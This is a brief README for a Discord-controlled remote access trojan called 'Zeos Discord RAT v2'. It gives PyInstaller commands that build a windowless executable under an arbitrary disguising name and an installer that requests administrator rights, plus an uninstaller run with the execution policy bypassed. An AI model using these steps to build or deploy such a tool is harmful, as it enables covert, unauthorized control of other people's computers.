# Zeos Discord RAT v2

## Useful Commands

### Install deps

```python
uv sync
```

### Install pyinstaller as dev dep

```python
uv add --dev pyinstaller
```

### Generate exe file

```python
uv run pyinstaller --onefile --noconsole --paths src --name "<your-app-name>" main.py
```

### Generate installer

```python
uv run pyinstaller --clean --onefile --console --uac-admin --collect-data certifi --name "installer" installer.py
```

### Run uninstaller.ps1 to uninstall the rat

```pwsh
Set-ExecutionPolicy -Scope Process Bypass
.\uninstaller.ps1
```
